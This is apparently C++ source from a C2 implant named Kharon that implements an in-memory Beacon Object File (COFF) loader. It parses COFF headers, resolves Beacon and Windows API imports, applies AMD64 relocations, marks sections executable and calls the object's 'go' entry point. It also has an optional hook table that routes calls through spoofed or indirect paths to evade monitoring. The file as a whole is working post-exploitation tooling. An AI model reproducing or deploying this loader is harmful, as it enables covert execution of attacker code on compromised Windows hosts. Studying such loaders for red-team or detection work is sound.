#include <Kharon.h>

typedef struct {
    PVOID Base;
    ULONG Size;
} SECTION_DATA;

typedef struct {
    PCHAR Name;
    ULONG Hash;
    UINT8 Type; // ( COFF_VAR | COFF_FNC | COFF_IMP )
    ULONG Rva;
    PVOID Ptr;
} SYMBOL_DATA;

typedef struct {
    SYMBOL_DATA*  Sym;
    SECTION_DATA* Sec;
} COFF_DATA;

auto Coff::GetCmdID(
    PVOID Address
) -> ULONG {
    BOF_OBJ* Obj = Node;

    while ( Obj ) {
        if ( Address >= Obj->MmBegin && Address < Obj->MmEnd ) {
            return Obj->CmdID; 
        }
        Obj = Obj->Next;
    }

    return 0; 
}

auto Coff::GetTask(
    PVOID Address
) -> CHAR* {
    BOF_OBJ* Obj = Node;

    while ( Obj ) {
        if ( Address >= Obj->MmBegin && Address < Obj->MmEnd ) {
            return Obj->UUID; 
        }
        Obj = Obj->Next;
    }

    return nullptr; 
}

auto Coff::Add(
    PVOID MmBegin,
    PVOID MmEnd,
    CHAR* UUID,
    ULONG CmdID
) -> BOF_OBJ* {
    BOF_OBJ* NewObj = (BOF_OBJ*)hAlloc( sizeof( BOF_OBJ ) );

    if (
        ! MmBegin ||
        ! MmEnd   ||
        ! UUID
    ) {
        return nullptr;
    }

    NewObj->MmBegin = MmBegin;
    NewObj->MmEnd   = MmEnd;
    NewObj->UUID    = UUID;
    NewObj->CmdID   = CmdID;

    if ( !this->Node ) {
        this->Node = NewObj;
    } else {
        BOF_OBJ* Current = Node;

        while ( Current->Next ) {
            Current = Current->Next;
        }

        Current->Next = NewObj;
    }

    return NewObj;
}

auto Coff::Rm(
    BOF_OBJ* Obj
) -> BOOL {
    if ( ! Obj || !this->Node ) {
        return FALSE; 
    }

    if ( this->Node == Obj ) {
        BOF_OBJ* NextNode = this->Node->Next;
        hFree( this->Node );
        this->Node = NextNode;
        return TRUE;
    }

    BOF_OBJ* Previous = this->Node;
    while ( Previous->Next && Previous->Next != Obj) {
        Previous = Previous->Next;
    }

    if ( Previous->Next == Obj ) {
        BOF_OBJ* NextNode = Obj->Next;
        hFree(Obj);      
        Previous->Next = NextNode;
        return TRUE;
    }

    return FALSE;
}

auto Coff::RslRel(
    _In_ PVOID  Base,
    _In_ PVOID  Rel,
    _In_ UINT16 Type
) -> VOID {
    PVOID FlRel = (PVOID)((ULONG_PTR)Base + DEF32( Rel ));

    switch (Type) {
        case IMAGE_REL_AMD64_REL32:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32)); break;
        case IMAGE_REL_AMD64_REL32_1:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 1); break;
        case IMAGE_REL_AMD64_REL32_2:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 2); break;
        case IMAGE_REL_AMD64_REL32_3:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 3); break;
        case IMAGE_REL_AMD64_REL32_4:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 4); break;
        case IMAGE_REL_AMD64_REL32_5:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 5); break;
        case IMAGE_REL_AMD64_ADDR64:
            DEF64( Rel ) = (UINT64)(ULONG_PTR)FlRel; break;
    }
}

auto Coff::RslApi(
    _In_ PCHAR SymName
) -> PVOID {
    PVOID ApiAddress = nullptr;

    KhDbg("Starting resolution for symbol %s", SymName);
    SymName += 6;
    
    //
    // check if is Beacon api and resolve this function
    //
    if ( Str::StartsWith( (BYTE*)SymName, (BYTE*)"Beacon" ) ) {
        for ( int i = 0; i < sizeof( ApiTable ) / sizeof( ApiTable[0] ); i++ ) {
            KhDbg("Checking ApiTable[%d] (Hash: 0x%X vs Target: 0x%X)", i, ApiTable[i].Hash, Hsh::Str( SymName ));
            if ( Hsh::Str( SymName ) == ApiTable[i].Hash ) {
                ApiAddress = ApiTable[i].Ptr;
                KhDbg("Found match at index %d (Address: 0x%p)", i, ApiAddress);
                break;
            }
        }
    }

    KhDbg("symbol not in ApiTable, attempting dynamic resolution");

    //
    // check GetProcAddress, GetModuleHandle or LoadLibrary
    //
    if ( Hsh::Str( SymName ) == Hsh::Str( "GetProcAddress"         ) ) return (PVOID)Self->Krnl32.GetProcAddress;
    if ( Hsh::Str( SymName ) == Hsh::Str( "FreeLibrary"            ) ) return (PVOID)Self->Krnl32.FreeLibrary;
    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryW"           ) ) return (PVOID)Self->Cf->LoadLibraryW;
    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryA"           ) ) return (PVOID)Self->Cf->LoadLibraryA;
    if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleA"       ) ) return (PVOID)Self->Krnl32.GetModuleHandleA;
    if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleW"       ) ) return (PVOID)Self->Krnl32.GetModuleHandleW;
    if ( Hsh::Str( SymName ) == Hsh::Str( "LdrGetProcedureAddress" ) ) return (PVOID)Self->Ntdll.LdrGetProcedureAddress;

    //
    // if not beacon api, resolve the windows api
    //
    if ( ! ApiAddress ) {
        CHAR RawBuff[MAX_PATH];

        PCHAR LibName = nullptr;
        PCHAR FncName = nullptr;
        BYTE  OffSet  = 0;

        PVOID LibPtr = nullptr;
        PVOID FncPtr = nullptr;

        Mem::Zero( (UPTR)RawBuff, sizeof( RawBuff ) );
        Mem::Copy( RawBuff, SymName, Str::LengthA( SymName ) );
        KhDbg("Raw symbol name: %s %d", RawBuff, sizeof(RawBuff) );

        for ( INT i = 0; i < sizeof( RawBuff ); i++ ) {
            if ( ( RawBuff[i] == (CHAR)'$' ) ) {
                OffSet = i; RawBuff[i] = 0;
                KhDbg("found delimiter at offset %d", OffSet);
                break;
            }
        }

        LibName = RawBuff;
        FncName = &RawBuff[OffSet+1];

        //
        // if hook bof enabled apply the spoof/indirect
        //        
        if ( Self->Config.BofProxy ) {
            for ( INT i = 0; i < 15; i++ ) {
                if ( Hsh::Str( FncName ) == this->HookTable[i].Hash ) {
                    return (PVOID)this->HookTable[i].Ptr;
                }
            }
        }

        INT totalLength = Str::LengthA(LibName) + Str::LengthA(".dll") + 1;

        CHAR LibNameOrg[totalLength];

        Mem::Copy(LibNameOrg, LibName, Str::LengthA(LibName));
        Mem::Copy(LibNameOrg + Str::LengthA(LibName), (PCHAR)".dll", Str::LengthA(".dll"));

        LibNameOrg[totalLength - 1] = '\0';

        KhDbg("lib name: %s fnc name: %s", LibNameOrg, FncName);

        LibPtr = (PVOID)LdrLoad::Module( Hsh::Str<CHAR>( LibNameOrg ) );
        KhDbg("lib found at %p", LibPtr);
        if ( !LibPtr ) {
            KhDbg("loading library %s dynamically", LibNameOrg);
            LibPtr = (PVOID)Self->Lib->Load( (PCHAR)LibNameOrg );
            KhDbg("lib found at %p", LibPtr);
        }

        if ( !LibPtr ) return nullptr;

        KhDbg("resolving function %s in library 0x%p", FncName, LibPtr);
        FncPtr = (PVOID)Self->Krnl32.GetProcAddress( (HMODULE)LibPtr, FncName ); //LdrLoad::Api<PVOID>( (UPTR)LibPtr, Hsh::Str<CHAR>( FncName ) );
        
        if ( FncPtr ) {
            ApiAddress = FncPtr;
            KhDbg("resolved address: 0x%p", ApiAddress);
        }
    }

    KhDbg("returning address: 0x%p", ApiAddress);
    return ApiAddress;
}

auto Coff::Loader(
    _In_ BYTE* Buffer,
    _In_ ULONG Size,
    _In_ BYTE* Args,
    _In_ ULONG Argc,
    _In_ CHAR* UUID,
    _In_ ULONG CmdID
) -> BOOL {
    PVOID  MmBase   = nullptr;
    ULONG  MmSize   = 0;
    PVOID  LastSec  = nullptr;
    PVOID  TmpBase  = nullptr;

    ULONG SecNbrs = 0;
    ULONG SymNbrs = 0;

    ULONG SecLength = 0;
    UINT8 Iterator  = 0;

    PIMAGE_FILE_HEADER    Header  = { 0 };
    IMAGE_SECTION_HEADER* SecHdr  = { 0 };
    PIMAGE_SYMBOL         Symbols = { 0 };
    PIMAGE_RELOCATION     Relocs  = { 0 };

    KhDbg("starting COFF loading process");

    //
    // check if valid
    //
    if ( ! Buffer || Size < sizeof(IMAGE_FILE_HEADER) ) {
        KhDbg("invalid COFF buffer or size");
        return FALSE;
    }

    //
    // parse bof headers
    //
    Header  = (PIMAGE_FILE_HEADER)Buffer;
    SecHdr  = (IMAGE_SECTION_HEADER*)(Buffer + sizeof(IMAGE_FILE_HEADER));
    SecNbrs = Header->NumberOfSections;
    SymNbrs = Header->NumberOfSymbols;

    if ( SymNbrs == 0 || SecNbrs == 0 ) {
        KhDbg("invalid section or symbol count");
        return FALSE;
    }

    if ( 
        Header->PointerToSymbolTable >= Size || 
        Header->PointerToSymbolTable + ( SymNbrs * sizeof(IMAGE_SYMBOL) ) > Size
    ) {
        KhDbg("invalid symbol table offset");
        return FALSE;
    }

    Symbols = (PIMAGE_SYMBOL)( Buffer + Header->PointerToSymbolTable );
    KhDbg("found %d sections and %d symbols", SecNbrs, SymNbrs);

    COFF_DATA CoffData = { 0 };

    auto CleanCoff = [&]( VOID ) -> BOOL {
        if ( MmBase       ) Self->Mm->Free( MmBase, MmSize, MEM_RELEASE );
        if ( CoffData.Sec ) hFree( CoffData.Sec );
        if ( CoffData.Sym ) hFree( CoffData.Sym );

        KhDbg("COFF loading completed");
        
        return TRUE;
    };

    //
    // allocate memory to section and symbols list
    //
    CoffData.Sec = (SECTION_DATA*)hAlloc( SecNbrs * sizeof(SECTION_DATA) );
    CoffData.Sym = (SYMBOL_DATA*)hAlloc( SymNbrs * sizeof(SYMBOL_DATA) );
    
    if ( !CoffData.Sec || !CoffData.Sym ) {
        KhDbg("failed to allocate memory for sections/symbols"); return FALSE;
    }

    KhDbg(
        "allocated %d bytes for sections and %d bytes for symbols", 
        SecNbrs * sizeof(SECTION_DATA), SymNbrs * sizeof(SYMBOL_DATA)
    );

    //
    // get size for allocation and parse the symbols name
    //
    for ( INT i = 0; i < SymNbrs; i++ ) {
        PCHAR SymName     = nullptr;
        BYTE StorageClass = Symbols[i].StorageClass;

        if ( Symbols[i].N.Name.Short ) {
            SymName = (PCHAR)&Symbols[i].N.ShortName;
        } else {
            ULONG NameOffset = Symbols[i].N.Name.Long;
            
            if ( Header->PointerToSymbolTable + (SymNbrs * sizeof(IMAGE_SYMBOL)) + NameOffset >= Size ) {
                KhDbg("symbol name out of bounds (index %d)", i);
                continue;  
            }

            SymName = (PCHAR)(Buffer + Header->PointerToSymbolTable + (SymNbrs * sizeof(IMAGE_SYMBOL)) + NameOffset);
        }

        if ( !SymName ) {
            KhDbg("invalid symbol name (index %d)", i);
            continue;
        }

        CoffData.Sym[i].Name = SymName;
        CoffData.Sym[i].Hash = Hsh::Str<CHAR>(SymName);
        StorageClass         = Symbols[i].StorageClass;

        KhDbg("processing symbol %d: %s (Class: 0x%X)", i, SymName, StorageClass);

        if (Str::StartsWith( (BYTE*)SymName, (BYTE*)"__imp_") ) {
            MmSize = PAGE_ALIGN(MmSize + sizeof(PVOID));
            CoffData.Sym[i].Type = COFF_IMP;
            CoffData.Sym[i].Ptr  = this->RslApi(SymName);
            KhDbg("import symbol resolved to 0x%p", CoffData.Sym[i].Ptr);
        } 
        else if (ISFCN(Symbols[i].Type)) {
            CoffData.Sym[i].Type = COFF_FNC;
            CoffData.Sym[i].Rva = Symbols[i].Value;
        } 
        else if (
            !ISFCN(Symbols[i].Type) &&
            StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
            !Str::StartsWith( (BYTE*)SymName, (BYTE*)"__imp_" ) 
        ) {
            CoffData.Sym[i].Type = COFF_VAR;
            CoffData.Sym[i].Rva = Symbols[i].Value;
            KhDbg("variable symbol identified: %s", SymName);
        }
    }

    for ( INT i = 0; i < SecNbrs; i++ ) {
        MmSize = PAGE_ALIGN( MmSize + SecHdr[i].SizeOfRawData );
    }

    //
    // allocate memory to store bof
    //
    KhDbg("total memory required: %d bytes (aligned)", MmSize);
    MmBase = Self->Mm->Alloc( nullptr, MmSize, MEM_COMMIT, PAGE_READWRITE );
    if ( !MmBase ) {
        KhDbg("failed to allocate memory for COFF"); return CleanCoff();
    }

    KhDbg("allocated memory at 0x%p", MmBase);

    // 
    // copy sections to memory allocated and align the page
    // 
    TmpBase = MmBase;
    for (INT i = 0; i < SecNbrs; i++) {
        CoffData.Sec[i].Base = TmpBase;
        CoffData.Sec[i].Size = SecHdr[i].SizeOfRawData;

        KhDbg(
            "[x] section\n\t- name: %s\n\t- base: %p\n\t- size: %d", 
            SecHdr[i].Name, CoffData.Sec[i].Base, CoffData.Sec[i].Size
        );

        Mem::Copy(
            (BYTE*)TmpBase + SecHdr[i].VirtualAddress,
            Buffer + SecHdr[i].PointerToRawData,
            SecHdr[i].SizeOfRawData
        );


        TmpBase = (PVOID)PAGE_ALIGN((ULONG_PTR)TmpBase + SecHdr[i].SizeOfRawData);
    }

    LastSec = TmpBase;

    //
    // apply relocations
    //
    {
        PVOID* ImportTable = (PVOID*)LastSec;
        for ( INT i = 0; i < SecNbrs; i++ ) {
            Relocs = (PIMAGE_RELOCATION)( Buffer + SecHdr[i].PointerToRelocations );
            KhDbg("processing %d relocations for section %s %d", SecHdr[i].NumberOfRelocations, SecHdr[i].Name, i);

            for ( INT x = 0; x < SecHdr[i].NumberOfRelocations; x++ ) {
                PIMAGE_SYMBOL SymReloc = &Symbols[Relocs[x].SymbolTableIndex];
                PVOID RelocAddr = (PVOID)((ULONG_PTR)CoffData.Sec[i].Base + Relocs[x].VirtualAddress);

                KhDbg("processing symbol: %s", CoffData.Sym[Relocs[x].SymbolTableIndex].Name);

                if ( Relocs[x].Type == IMAGE_REL_AMD64_REL32 && CoffData.Sym[Relocs[x].SymbolTableIndex].Type == COFF_IMP ) {

                    ImportTable[Iterator] = CoffData.Sym[Relocs[x].SymbolTableIndex].Ptr;
                    DEF32( RelocAddr ) = (UINT32)((ULONG_PTR)&ImportTable[Iterator] - (ULONG_PTR)RelocAddr - 4);
                    Iterator++;
                    KhDbg("applied REL32 import relocation at %p", RelocAddr);

                } else {
                    PVOID TargetBase = CoffData.Sec[SymReloc->SectionNumber-1].Base;
                    PVOID TargetAddr = (PVOID)((ULONG_PTR)TargetBase + SymReloc->Value);
                    this->RslRel(TargetAddr, RelocAddr, Relocs[x].Type);

                    KhDbg("relocated target %p", TargetAddr);
                }
            }
        }
    }

    //
    // Set proper memory protections
    //
    for (INT j = 0; j < SecNbrs; j++) {
        ULONG OldProt = 0;
        
        if ( SecHdr[j].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            ULONG NewProt = PAGE_EXECUTE_READ;
            Self->Mm->Protect( CoffData.Sec[j].Base, CoffData.Sec[j].Size, NewProt, &OldProt );
        }
    }

    //
    // found the go symbol (entrypoint), change the section protection and call
    //
    for ( INT i = 0; i < SymNbrs; i++ ) {
        if (
             CoffData.Sym[i].Type == COFF_FNC &&
             CoffData.Sym[i].Hash == Hsh::Str<CHAR>( "go" )
        ) {
            for ( INT j = 0; j < SecNbrs; j++ ) {
                if ( Symbols[i].SectionNumber == j + 1 ) {
                    PVOID GoPtr = PTR( U_PTR( CoffData.Sec[j].Base ) + Symbols[i].Value );
                    ULONG OldProt = 0;

                    KhDbg("found 'go' function at 0x%p (Section %d, Offset 0x%X)", GoPtr, j, Symbols[i].Value);

                    BOF_OBJ* Obj = (BOF_OBJ*)this->Add( MmBase, PTR( U_PTR( MmBase ) + MmSize ), UUID, CmdID );
                    if ( Obj ) KhDbg("added the object to the list");

                    VOID ( *Go )( BYTE*, ULONG ) = ( decltype( Go ) )( GoPtr );
                    KhDbg("calling 'go' function");
                    Go( Args, Argc );

                    if ( this->Rm( Obj ) ) KhDbg("removed the object to the list");
                }
            }
        }
    }

    return CleanCoff();
}